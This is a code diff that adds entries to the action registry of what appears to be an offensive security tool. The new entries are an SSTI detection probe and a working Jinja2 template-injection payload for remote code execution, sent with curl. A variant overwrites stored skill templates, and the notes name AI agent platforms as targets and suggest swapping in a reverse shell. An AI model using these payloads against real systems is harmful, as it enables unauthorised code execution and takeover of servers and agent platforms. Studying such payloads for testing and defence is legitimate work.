@@ -490,6 +490,22 @@ ACTION_REGISTRY: dict[str, Action] = {
         note="Split Jinja2 SSTI: when an app templates multiple user-controlled fields "
              "into one page, split the {{ }} across fields to bypass per-field validation. "
              "Learned from OSAI module 8."),
+    "craft_ssti_probe": _a("craft_ssti_probe",
+        ["curl -sk -X POST $URL$ENDPOINT -H 'Content-Type: application/json' "
+         "-d '{\"message\":\"X{{7*7}}X\"}'  # server-side template render? look for X49X"],
+        outputs="http",
+        note="Math-marker SSTI detector: X{{7*7}}X -> X49X means a server-side Jinja2/Twig "
+             "renderer. Also try a `template` field on render/skill endpoints."),
+    "craft_jinja2_ssti_rce": _a("craft_jinja2_ssti_rce",
+        ["# Jinja2 SSTI RCE — sandbox-free globals via cycler (no config/self needed):",
+         "curl -sk -X POST $URL$ENDPOINT -H 'Content-Type: application/json' "
+         "-d '{\"template\":\"OUT[{{ cycler.__init__.__globals__.os.popen(\\\"id\\\").read() }}]\"}'",
+         "# Skill/template-store variant: overwrite an existing template then invoke it:",
+         "#   POST $URL/api/skills {name:<existing>, template:<payload>} ; POST $URL/api/run/<existing>"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Direct Jinja2 SSTI RCE polyglot. Works against a `template` render field (GitLab-Duo "
+             "workflows/render) or an overwritable skill template (Goose skills hub). Swap id for a "
+             "reverse shell."),
 
     # --- AI advanced: OpenAPI surface discovery ---
     "probe_openapi_spec": _a("probe_openapi_spec",
